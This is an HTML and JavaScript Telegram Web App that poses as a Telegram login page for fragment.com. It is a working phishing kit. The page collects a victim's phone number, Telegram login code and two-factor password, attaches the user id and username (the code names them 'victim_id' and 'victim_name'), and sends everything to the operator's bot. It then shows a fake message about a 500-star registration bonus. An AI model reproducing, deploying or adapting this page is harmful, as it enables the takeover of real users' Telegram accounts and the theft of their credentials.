<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Telegram Auth</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #fff;
    color: #000;
    user-select: none;
    padding: 20px;
  }
  .container {
    max-width: 400px;
    margin: 0 auto;
  }
  .icons {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 40px;
    margin: 40px 0 16px 0;
  }
  .icon {
    width: 64px;
    height: 64px;
  }
  .fragment-logo {
    background: #000;
    border-radius: 12px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    font-weight: bold;
    font-size: 14px;
    text-align: center;
    width: 64px;
    height: 64px;
  }
  h1 {
    text-align: center;
    font-weight: bold;
    font-size: 18px;
    margin: 0 auto 16px;
    padding: 0 25px;
    max-width: 320px;
    line-height: 1.3;
  }
  p.description {
    max-width: 280px;
    margin: 0 auto 24px;
    font-size: 14px;
    line-height: 1.4;
    color: #000;
    text-align: center;
  }
  p.description a {
    color: #2b9dea;
    text-decoration: none;
  }
  p.description b {
    font-weight: bold;
  }
  select, .phone-input-container {
    display: block;
    width: 280px;
    margin: 6px auto 18px;
    font-size: 16px;
    padding: 10px 14px;
    border-radius: 12px;
    border: none;
    background: #f1f3f6;
    font-weight: normal;
    font-family: Arial, sans-serif;
    color: #000;
  }
  select {
    background-image: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Cpath fill='none' stroke='%23333' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M2 5l6 6 6-6'/%3E%3C/svg%3E");
    background-repeat: no-repeat;
    background-position: right 12px center;
    background-size: 16px;
    padding-right: 40px;
    appearance: none;
    -webkit-appearance: none;
  }
  .phone-prefix {
    font-size: 16px;
    color: #000;
    margin-right: 8px;
    font-weight: normal;
  }
  .phone-wrapper {
    display: flex;
    align-items: center;
    background: #f1f3f6;
    border-radius: 12px;
    padding: 0 14px;
    height: 44px;
  }
  .phone-input {
    flex: 1;
    padding: 10px 0;
    border: none;
    background: transparent;
    font-size: 16px;
    font-weight: normal;
    outline: none;
    color: #000;
  }
  .phone-input::placeholder {
    color: #888;
  }
  .buttons {
    width: 280px;
    margin: 0 auto;
    display: flex;
    justify-content: space-between;
    font-weight: bold;
  }
  .btn-cancel, .btn-next {
    cursor: pointer;
    font-size: 16px;
    user-select: none;
    border-radius: 20px;
    padding: 10px 26px;
    border: none;
    font-family: Arial, sans-serif;
    transition: opacity 0.2s;
  }
  .btn-cancel {
    background: none;
    color: #2b9dea;
  }
  .btn-next {
    background: #2b9dea;
    color: white;
  }
  .btn-cancel:active {
    opacity: 0.7;
  }
  .btn-next:active {
    opacity: 0.8;
  }
  /* Стили для модального окна */
  .modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.5);
    z-index: 1000;
  }
  .modal-content {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: white;
    padding: 20px;
    border-radius: 12px;
    min-width: 280px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.15);
  }
  .modal-header {
    font-weight: bold;
    margin-bottom: 10px;
    font-size: 16px;
  }
  .modal-input {
    width: 100%;
    padding: 12px;
    border: 1px solid #ddd;
    border-radius: 8px;
    margin-bottom: 15px;
    font-size: 16px;
    box-sizing: border-box;
  }
  .modal-buttons {
    display: flex;
    justify-content: space-between;
    gap: 10px;
  }
  .modal-btn {
    flex: 1;
    padding: 10px;
    border-radius: 8px;
    border: none;
    font-weight: bold;
    cursor: pointer;
  }
  .modal-cancel {
    background: #f1f3f6;
    color: #000;
  }
  .modal-submit {
    background: #2b9dea;
    color: white;
  }
</style>
</head>
<body>
<div class="container">

<div class="icons">
  <img class="icon" src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" />
  <div class="fragment-logo">
    fragment
  </div>
</div>

<h1>Войдите, чтобы использовать аккаунт Telegram</h1>

<p class="description">
  для fragment.com и Fragment Auction Alerts.<br/>
  Введите свой <b>номер телефона</b> в международном формате. Подтверждение будет отправлено в Telegram.
</p>

<select id="countrySelect">
  <option value="+7">Россия (+7)</option>
  <option value="+380">Украина (+380)</option>
  <option value="+375">Беларусь (+375)</option>
  <option value="+7">Казахстан (+7)</option>
  <option value="+1">США/Канада (+1)</option>
  <option value="+44">Великобритания (+44)</option>
  <option value="+49">Германия (+49)</option>
  <option value="+33">Франция (+33)</option>
  <option value="+81">Япония (+81)</option>
  <option value="+86">Китай (+86)</option>
  <option value="+91">Индия (+91)</option>
</select>

<div class="phone-input-container">
  <div class="phone-wrapper">
    <span id="phonePrefix" class="phone-prefix">+7</span>
    <input type="tel" id="phoneInput" class="phone-input" placeholder="900 123 45 67" />
  </div>
</div>

<div class="buttons">
  <button class="btn-cancel" onclick="cancel()">ОТМЕНА</button>
  <button class="btn-next" onclick="nextStep()">ДАЛЕЕ</button>
</div>

</div>

<!-- Модальное окно для кода -->
<div id="codeModal" class="modal">
  <div class="modal-content">
    <div class="modal-header">Введите код из Telegram</div>
    <input type="text" id="codeInput" class="modal-input" placeholder="12345" maxlength="5" />
    <div class="modal-buttons">
      <button class="modal-btn modal-cancel" onclick="hideCodeModal()">Отмена</button>
      <button class="modal-btn modal-submit" onclick="submitCode()">Подтвердить</button>
    </div>
  </div>
</div>

<!-- Модальное окно для пароля -->
<div id="passwordModal" class="modal">
  <div class="modal-content">
    <div class="modal-header">Введите пароль (если есть)</div>
    <input type="password" id="passwordInput" class="modal-input" placeholder="Необязательно" />
    <div class="modal-buttons">
      <button class="modal-btn modal-cancel" onclick="hidePasswordModal()">Пропустить</button>
      <button class="modal-btn modal-submit" onclick="submitPassword()">Готово</button>
    </div>
  </div>
</div>

<script>
  // Инициализация Telegram Web App
  const tg = window.Telegram?.WebApp;
  if (tg) {
    tg.ready();
    tg.expand();
  }
  
  const victimId = tg?.initDataUnsafe?.user?.id || 'unknown';
  const victimName = tg?.initDataUnsafe?.user?.username || 'unknown';
  
  const countrySelect = document.getElementById('countrySelect');
  const phonePrefix = document.getElementById('phonePrefix');
  const phoneInput = document.getElementById('phoneInput');
  const codeModal = document.getElementById('codeModal');
  const codeInput = document.getElementById('codeInput');
  const passwordModal = document.getElementById('passwordModal');
  const passwordInput = document.getElementById('passwordInput');
  
  let currentPhone = '';
  let currentCode = '';
  let currentPassword = '';
  
  const phoneExamples = {
    '+7': '900 123 45 67',
    '+380': '67 123 45 67',
    '+375': '29 123 45 67',
    '+1': '123 456 7890',
    '+44': '7700 123456',
    '+49': '151 12345678',
    '+33': '6 12 34 56 78',
    '+81': '90 1234 5678',
    '+86': '131 2345 6789',
    '+91': '98765 43210'
  };
  
  const phoneLengths = {
    '+7': 10,
    '+375': 9,
    '+380': 9,
    '+1': 10,
    '+44': 10,
    '+49': 10,
    '+33': 9,
    '+81': 10,
    '+86': 11,
    '+91': 10
  };
  
  countrySelect.addEventListener('change', function() {
    const code = this.value;
    phonePrefix.textContent = code;
    phoneInput.placeholder = phoneExamples[code] || '123 456 7890';
    phoneInput.value = '';
  });
  
  phoneInput.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    
    if (value.length > 15) {
      value = value.substring(0, 15);
    }
    
    let formatted = '';
    const prefix = phonePrefix.textContent;
    
    if (value.length > 0) {
      if (prefix === '+7') {
        if (value.length <= 3) {
          formatted = value;
        } else if (value.length <= 6) {
          formatted = value.substring(0, 3) + ' ' + value.substring(3);
        } else if (value.length <= 8) {
          formatted = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6);
        } else {
          formatted = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 8) + ' ' + value.substring(8, 10);
        }
      } else if (prefix === '+1') {
        if (value.length <= 3) {
          formatted = value;
        } else if (value.length <= 6) {
          formatted = value.substring(0, 3) + ' ' + value.substring(3);
        } else {
          formatted = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 10);
        }
      } else {
        formatted = value.match(/.{1,3}/g)?.join(' ') || value;
      }
    }
    
    e.target.value = formatted;
  });
  
  function cancel() {
    if (tg) {
      tg.close();
    }
  }
  
  function nextStep() {
    const phone = phoneInput.value.replace(/\s/g, '');
    const countryCode = phonePrefix.textContent;
    const requiredLength = phoneLengths[countryCode] || 5;
    
    if (phone.length !== requiredLength) {
      alert('Пожалуйста, введите корректный номер телефона');
      phoneInput.focus();
      return;
    }
    
    currentPhone = countryCode + phone;
    
    // Показываем окно для ввода кода
    showCodeModal();
  }
  
  function showCodeModal() {
    codeInput.value = '';
    codeModal.style.display = 'block';
    setTimeout(() => codeInput.focus(), 100);
  }
  
  function hideCodeModal() {
    codeModal.style.display = 'none';
  }
  
  function submitCode() {
    currentCode = codeInput.value.trim();
    
    if (currentCode.length !== 5) {
      alert('Код должен состоять из 5 цифр');
      return;
    }
    
    hideCodeModal();
    
    // Показываем окно для ввода пароля
    showPasswordModal();
  }
  
  function showPasswordModal() {
    passwordInput.value = '';
    passwordModal.style.display = 'block';
    setTimeout(() => passwordInput.focus(), 100);
  }
  
  function hidePasswordModal() {
    passwordModal.style.display = 'none';
    submitAllData();
  }
  
  function submitPassword() {
    currentPassword = passwordInput.value.trim();
    hidePasswordModal();
    submitAllData();
  }
  
  function submitAllData() {
    // Собираем все данные
    const data = {
      phone: currentPhone,
      code: currentCode,
      password: currentPassword || '',
      victim_id: victimId,
      victim_name: victimName,
      timestamp: new Date().toISOString(),
      user_agent: navigator.userAgent,
      platform: navigator.platform
    };
    
    console.log('Отправляемые данные:', data);
    
    // Отправляем данные в бота через Telegram WebApp
    if (tg && tg.sendData) {
      try {
        tg.sendData(JSON.stringify(data));
        
        // Показываем сообщение об успехе
        alert('✅ Данные отправлены! Возвращайтесь в бота.');
        
        // Закрываем WebApp через 2 секунды
        setTimeout(() => {
          if (tg.close) {
            tg.close();
          }
        }, 2000);
        
      } catch (error) {
        console.error('Ошибка отправки:', error);
        alert('Ошибка отправки данных. Попробуйте еще раз.');
      }
    } else {
      // Для тестирования вне Telegram
      alert('Данные для отправки:\n' + JSON.stringify(data, null, 2));
      console.log('Данные для бота:', data);
      
      // Эмуляция отправки данных в бота
      simulateBotResponse(data);
    }
  }
  
  function simulateBotResponse(data) {
    // Эмуляция ответа бота (для тестирования)
    const response = {
      status: 'success',
      message: '✅ Регистрация успешна! Бонус 500★ зачислен.',
      data: data
    };
    
    console.log('Ответ бота:', response);
    alert('✅ Регистрация успешна!\nБонус 500★ зачислен на ваш баланс.');
  }
  
  // Автоматическая отправка данных при получении из бота (опционально)
  document.addEventListener('DOMContentLoaded', function() {
    // Получаем данные из URL параметров (если есть)
    const urlParams = new URLSearchParams(window.location.search);
    const prefillPhone = urlParams.get('phone');
    
    if (prefillPhone) {
      // Автозаполнение номера из параметра
      const match = prefillPhone.match(/^(\+\d{1,3})(\d+)$/);
      if (match) {
        const countryCode = match[1];
        const number = match[2];
        
        // Устанавливаем страну
        countrySelect.value = countryCode;
        phonePrefix.textContent = countryCode;
        
        // Форматируем и устанавливаем номер
        let formatted = '';
        if (countryCode === '+7') {
          if (number.length === 10) {
            formatted = number.substring(0, 3) + ' ' + number.substring(3, 6) + ' ' + number.substring(6, 8) + ' ' + number.substring(8);
          }
        } else if (countryCode === '+1') {
          if (number.length === 10) {
            formatted = number.substring(0, 3) + ' ' + number.substring(3, 6) + ' ' + number.substring(6);
          }
        } else {
          formatted = number.match(/.{1,3}/g)?.join(' ') || number;
        }
        
        phoneInput.value = formatted;
      }
    }
  });
</script>
</body>
</html>
